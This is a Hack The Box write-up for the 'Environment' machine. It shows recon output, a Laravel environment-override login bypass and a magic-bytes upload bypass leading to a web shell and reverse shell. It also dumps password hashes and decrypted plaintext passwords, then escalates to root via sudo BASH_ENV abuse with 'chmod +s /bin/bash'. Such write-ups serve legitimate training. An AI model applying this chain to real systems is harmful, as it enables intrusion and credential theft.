| **Machine**             | Environment                                                                                                               |
| :---------------------- | :------------------------------------------------------------------------------------------------------------------------------- |
| **Platform**            | Hack The Box                                                                                                                     |
| **Difficulty**          | Medium                                                                                                                           |
| Key Vulnerabilities | Authentication bypass via Laravel environment override (?--env=preprod), Unrestricted file upload → PHP RCE (magic-bytes check bypass), Credentials disclosure via exposed GnuPG keyring (keyvault.gpg), Privilege escalation via sudo env_keep+="ENV BASH_ENV" (BASH_ENV sourced by root script) |
| Tools Used | nmap, ffuf, Burp Suite, sqlite3, gpg, hashcat, busybox nc, ssh, tar, file |

## Reconnaissance
We start with Nmap to discover open ports on the machine.

```bash
─$ sudo nmap -sCV 10.129.232.3 -p- --min-rate=1000 -oN nmap_long
[sudo] password for kali: 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-16 07:28 EDT
Nmap scan report for 10.129.232.3
Host is up (0.023s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u5 (protocol 2.0)
| ssh-hostkey: 
|   256 5c:02:33:95:ef:44:e2:80:cd:3a:96:02:23:f1:92:64 (ECDSA)
|_  256 1f:3d:c2:19:55:28:a1:77:59:51:48:10:c4:4b:74:ab (ED25519)
80/tcp open  http    nginx 1.22.1
|_http-server-header: nginx/1.22.1
|_http-title: Did not follow redirect to http://environment.htb
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Only two ports are open. The HTTP port is running on an Nginx web server, and we can see it's a Debian machine. Before we open the website, we should add the vhost "environment" to our /etc/hosts file
```bash
└─$ echo "10.129.232.3 environment.htb" | sudo tee -a /etc/hosts
10.129.232.3 environment.htb
```

Visiting the web page, we see it's a static site. We can only give our email to join the site's mailing list, but since we didn't discover any SMTP port, I don't see it being exploited.
Accessing the /404 page to identify further technologies, I see a 404 page that's used in Laravel.

By typing /index.php, I also noticed the web server runs on PHP; typing anything else like .html or .aspx gives us 404.

<img width="1062" height="563" alt="2025-08-16 133624" src="https://github.com/user-attachments/assets/fd0564fb-dd7f-4506-97eb-a157409a709e" />

Let's start enumerating more directories with ffuf using a .php extension.

```bash
└─$ ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://environment.htb/FUZZ -c -e .php  

        /'___\  /'___\           /'___\                                                                                                
       /\ \__/ /\ \__/  __  __  /\ \__/                                                                                                
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\                                                                                               
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/                                                                                               
         \ \_\   \ \_\  \ \____/  \ \_\                                                                                                
          \/_/    \/_/   \/___/    \/_/                                                                                                

       v2.1.0-dev
________________________________________________

 :: Method           : GET                       
 :: URL              : http://environment.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
 :: Extensions       : .php 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

# Priority ordered case-sensitive list, where entries were found [Status: 200, Size: 4602, Words: 965, Lines: 88, Duration: 105ms]
#.php                   [Status: 200, Size: 4602, Words: 965, Lines: 88, Duration: 121ms]
[Status: 200, Size: 4602, Words: 965, Lines: 88, Duration: 138ms]
# Copyright 2007 James Fisher.php [Status: 200, Size: 4602, Words: 965, Lines: 88, Duration: 154ms]
#                       [Status: 200, Size: 4602, Words: 965, Lines: 88, Duration: 165ms]
index.php               [Status: 200, Size: 4602, Words: 965, Lines: 88, Duration: 170ms]
#.php                   [Status: 200, Size: 4602, Words: 965, Lines: 88, Duration: 181ms]
# directory-list-2.3-medium.txt.php [Status: 200, Size: 4602, Words: 965, Lines: 88, Duration: 198ms]
# on at least 2 different hosts [Status: 200, Size: 4602, Words: 965, Lines: 88, Duration: 210ms]
# on at least 2 different hosts.php [Status: 200, Size: 4602, Words: 965, Lines: 88, Duration: 223ms]
# license, visit http://creativecommons.org/licenses/by-sa/3.0/.php [Status: 200, Size: 4602, Words: 965, Lines: 88, Duration: 235ms]
# Priority ordered case-sensitive list, where entries were found.php [Status: 200, Size: 4602, Words: 965, Lines: 88, Duration: 243ms]
#                       [Status: 200, Size: 4602, Words: 965, Lines: 88, Duration: 255ms]
# Suite 300, San Francisco, California, 94105, USA. [Status: 200, Size: 4602, Words: 965, Lines: 88, Duration: 264ms]
# Attribution-Share Alike 3.0 License. To view a copy of this [Status: 200, Size: 4602, Words: 965, Lines: 88, Duration: 270ms]
#                       [Status: 200, Size: 4602, Words: 965, Lines: 88, Duration: 298ms]
# Copyright 2007 James Fisher [Status: 200, Size: 4602, Words: 965, Lines: 88, Duration: 314ms]
# directory-list-2.3-medium.txt [Status: 200, Size: 4602, Words: 965, Lines: 88, Duration: 324ms]
# or send a letter to Creative Commons, 171 Second Street,.php [Status: 200, Size: 4602, Words: 965, Lines: 88, Duration: 334ms]
# Suite 300, San Francisco, California, 94105, USA..php [Status: 200, Size: 4602, Words: 965, Lines: 88, Duration: 343ms]
# This work is licensed under the Creative Commons [Status: 200, Size: 4602, Words: 965, Lines: 88, Duration: 351ms]
# or send a letter to Creative Commons, 171 Second Street, [Status: 200, Size: 4602, Words: 965, Lines: 88, Duration: 362ms]
#.php                   [Status: 200, Size: 4602, Words: 965, Lines: 88, Duration: 372ms]
# This work is licensed under the Creative Commons.php [Status: 200, Size: 4602, Words: 965, Lines: 88, Duration: 379ms]
# Attribution-Share Alike 3.0 License. To view a copy of this.php [Status: 200, Size: 4602, Words: 965, Lines: 88, Duration: 387ms]
#.php                   [Status: 200, Size: 4602, Words: 965, Lines: 88, Duration: 401ms]
#                       [Status: 200, Size: 4602, Words: 965, Lines: 88, Duration: 410ms]
# license, visit http://creativecommons.org/licenses/by-sa/3.0/ [Status: 200, Size: 4602, Words: 965, Lines: 88, Duration: 424ms]

storage                 [Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 23ms]    
upload                  [Status: 405, Size: 244869, Words: 46159, Lines: 2576, Duration: 855ms]
up                      [Status: 200, Size: 2126, Words: 745, Lines: 51, Duration: 84ms]
logout                  [Status: 302, Size: 358, Words: 60, Lines: 12, Duration: 368ms]
vendor                  [Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 25ms]
build                   [Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 27ms]

```

We find a few interesting directories here. The login page asks us for creds; we don't have any. Maybe it's vulnerable to some attack like SQLi; I will come back here later..

<img width="1120" height="733" alt="2025-08-16 134233" src="https://github.com/user-attachments/assets/f4c76665-04e9-49f1-8da0-dd4be96d5c63" />

Visiting the /mailing directory, we get an error that the method is not allowed, along with the PHP version and, like we guessed previously, Laravel version 11.30.0.
<img width="1986" height="1190" alt="2025-08-16 134336" src="https://github.com/user-attachments/assets/84b0e803-7e94-44c4-88ee-53930e3826b8" />

I will use Burp Suite to change the request method to POST and see if we can access it.

<img width="2147" height="1053" alt="2025-08-16 134600" src="https://github.com/user-attachments/assets/6a4d411a-6429-4a0b-ad00-2fbaa17ad287" />

We see error code 419—maybe it expects some parameters from us, I don't know yet.

## Foothold

Going back to the login page, I found that the invalid credentials page was loaded from the web server.


<img width="756" height="60" alt="2025-08-16 154417" src="https://github.com/user-attachments/assets/3201fbd3-a5ec-4f27-b33d-aca2cc341761" />

I thought it could be a local file inclusion, but typing anything there appears also on the main site, so it's just reflected XSS.

<img width="1371" height="1194" alt="2025-08-16 154811" src="https://github.com/user-attachments/assets/b421e7bc-8680-4221-9fc6-92290e44fcb9" />

I tried a few things with POST /requests requests. After changing the "email" parameter to "email2", the site leaked almost the whole code. Also, since it's Laravel, I know that I can change the environment of Laravel with the ?--env=parameter. So I will use ?--env=preprod.

<img width="2148" height="1296" alt="2025-08-16 155124" src="https://github.com/user-attachments/assets/9b9b77b3-3c13-434a-8ab2-01e4c9f791d2" />

So if we change env to preprod, we are logged in as Hish, that's probably a backdoor left by the developer.

The only thing we can do on the site is to upload a profile picture.

<img width="2025" height="684" alt="2025-08-16 161345" src="https://github.com/user-attachments/assets/0970dadd-7aeb-44a5-83c1-5c33886738c6" />

Changing the picture, I noticed that it gets stored at /storage/files.
There is also a filter that probably checks magic bytes. I will try to create a payload bypassing the filter: I will take the magic bytes from a real picture, then create a shell.php.png file and then add a web shell payload there.

```bash

└─$ head -c 32 image4.jpg > shell.php.png                         

┌──(kali㉿kali)-[/tmp]
└─$ file shell.php.png     
shell.php.png: JPEG image data, JFIF standard 1.01, aspect ratio, density 1x1, segment length 16

```

At first I got errors because it was just reading raw data. Changing the extension to just .php helped, and I got a web shell..


<img width="1295" height="243" alt="2025-08-16 162139" src="https://github.com/user-attachments/assets/ab09b042-712d-478f-9151-5037a54df75e" />

I will from here try to get a reverse shell with busybox nc, and it worked!  I just need to upgrade the shell to a TTY and we can continue.

<img width="1769" height="643" alt="2025-08-16 162436" src="https://github.com/user-attachments/assets/94616af4-0179-4168-9de9-c77aa6776d6e" />

At /app/database I found an SQLite database, and inside the users table there are hashes

```bash
www-data@environment:~/app/database$ ls
database.sqlite  factories  migrations  seeders
www-data@environment:~/app/database$ sqlite3 database.sqlite 

```sqlite

SQLite version 3.40.1 2022-12-28 14:03:47
Enter ".help" for usage hints.
sqlite> .tables
cache                  jobs                   sessions             
cache_locks            mailing_list           users                
failed_jobs            migrations           
job_batches            password_reset_tokens
sqlite> select * from users;
1|Hish|hish@environment.htb||$2y$12$QPbeVM.u7VbN9KCeAJ.JA.WfWQVWQg0LopB9ILcC7akZ.q641r1gi||2025-01-07 01:51:54|2025-01-12 01:01:48|hish.png
2|Jono|jono@environment.htb||$2y$12$i.h1rug6NfC73tTb8XF0Y.W0GDBjrY5FBfsyX2wOAXfDWOUk9dphm||2025-01-07 01:52:35|2025-01-07 01:52:35|jono.png
3|Bethany|bethany@environment.htb||$2y$12$6kbg21YDMaGrt.iCUkP/s.yLEGAE2S78gWt.6MAODUD3JXFMS13J.||2025-01-07 01:53:18|2025-01-07 01:53:18|bethany.png
```

I tried to crack it with Hashcat, but it didn't work.
Exploring further in the /home/hish directory, I found a PGP RSA-encrypted key.

```bash
www-data@environment:/home/hish/backup$ ls
keyvault.gpg
www-data@environment:/home/hish/backup$ file keyvault.gpg 
keyvault.gpg: PGP RSA encrypted session key - keyid: B755B0ED D6CFCFD3 RSA (Encrypt or Sign) 2048b .
```

To decrypt it on my Kali machine, I also need the private keys and pubring.kbx, which we can also read in the /home/hish/.gnupg directory. I will download all to my machine.

<img width="876" height="287" alt="2025-08-16 164110" src="https://github.com/user-attachments/assets/5b5847db-4128-45d2-8efc-765939b62336" />

```bash
www-data@environment:/home/hish$ tar -czf /tmp/gnupg.tar.gz .gnupg 
```

After transferring the .gnupg directory, I can replace it on my own machine and decrypt it using gpg -d.

```bash
└─$ gpg -d keyvault.gpg       
gpg: WARNING: unsafe permissions on homedir '/home/kali/.gnupg'
gpg: encrypted with rsa2048 key, ID B755B0EDD6CFCFD3, created 2025-01-11
      "hish_ <hish@environment.htb>"
PAYPAL.COM -> Ihaves0meMon$yhere123
ENVIRONMENT.HTB -> marineSPm@ster!!
FACEBOOK.COM -> summerSunnyB3ACH!!
```

We log in with SSH and get the user flag.
<img width="2171" height="166" alt="2025-08-16 165427" src="https://github.com/user-attachments/assets/1efba523-d5ed-4422-bbe2-0a7bb1340818" />

## Privilege Escalation

Running sudo -l, we see we can run systeminfo as root..

```bash
hish@environment:~$ sudo -l
[sudo] password for hish: 
Matching Defaults entries for hish on environment:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, env_keep+="ENV BASH_ENV", use_pty

User hish may run the following commands on environment:
    (ALL) /usr/bin/systeminfo
hish@environment:~$ 
```

Analyzing the script, I noticed sudo keeps ENV/BASH_ENV (env_keep+="ENV BASH_ENV"). Because systeminfo is a bash script, I can set BASH_ENV to a file I control and it gets sourced as root when running sudo /usr/bin/systeminfo—this is an environment-variable (BASH_ENV) abuse.

1. I will create a root.sh bash script.
```bash
bash-5.2# cat root.sh
#!/bin/bash

chmod +s /bin/bash
```
2. set permessions to 777 for everyone.

```bash
chmod 777 root.sh
```

3. Execute the systeminfo binary with changed BASH_ENV we created.
```bash
sudo BASH_ENV=root.sh /usr/bin/systeminfo
```

4. Start bash in privileged mode
```bash
/bin/bash -p
```

now we are run and can grap a flag.

```bash
bash-5.2# cat /root/root.txt
5fd867a2739cd7377ece1b5717f25171
```

Machine rooted.
